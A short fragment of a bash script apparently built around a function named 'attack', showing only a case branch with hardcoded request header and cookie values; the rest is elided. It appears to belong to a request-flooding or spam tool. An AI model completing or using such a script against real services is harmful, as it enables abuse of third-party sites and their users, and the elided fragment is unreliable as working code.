...
attack(){
    ...
    case "$list" in
        "0")
            ...
            -H $'Cookie: __cfduid=d9ba7321416b4dfeac82912dd18ab4b041589902422; G_ENABLED_IDPS=google; G_AUTHUSER_H=0' \
            -b $'__cfduid=d9ba7321416b4dfeac82912dd18ab4b041589902422; G_ENABLED_IDPS=google; G_AUTHUSER_H=0' \
